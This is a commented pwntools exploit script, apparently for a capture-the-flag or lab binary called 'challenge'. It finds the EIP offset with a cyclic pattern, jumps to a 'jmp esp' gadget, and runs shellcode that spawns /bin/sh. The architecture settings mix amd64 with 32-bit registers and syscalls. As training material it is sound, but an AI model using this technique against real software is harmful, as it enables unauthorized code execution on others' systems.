#!/usr/bin/env python3

from pwn import *

context.update(
    arch="amd64",
    endian="little",
    os="linux",
    log_level="debug"
)

# Load a copy of the binary so that we can find a JMP ESP
elf = ELF("./challenge")

# Create an instance of the process to talk to
process = gdb.debug(elf.path)

# Attach a debugger to the process so that we can step through
pause()

# Assemble the byte sequence for 'jmp esp' so we can search for it
jmp_esp = asm("jmp esp")
jmp_esp = elf.search(jmp_esp).next()

log.info("Found jmp esp at %#x" % jmp_esp)

# Overflow the buffer with a cyclic pattern to make it easy to find offsets
# Toggle this to send the shellcode instead
#
# If we let the program crash with just the pattern as input, the register
# state will look something like this:
#
#  EBP  0x6161616b ('kaaa')
# *ESP  0xff84be30 <-- 'maaanaaaoaaapaaaqaaar...'
# *EIP  0x6161616c ('laaa')
crash = False

if crash:
    pattern = cyclic(512)
    process.sendline(pattern)
    pause()
    sys.exit()

# Fill out the buffer until where we control EIP
exploit = cyclic(cyclic_find(0x6161616c))

# Fill the spot we control EIP with a 'jmp esp'
exploit += pack(jmp_esp)

# sh = asm("\n".join([
#     "push %d" % u32("/sh\0"),
#     "push %d" % u32("/bin"),
#     "xor edx, edx",
#     "xor ecx, ecx",
#     "mov ebx, esp",
#     "mov eax, SYS_execve",
#     "int 0x80",
# ]))

# Add the shellcode
exploit += asm(shellcraft.sh())

# gets() waits for a newline
process.sendline(exploit)
process.interactive()
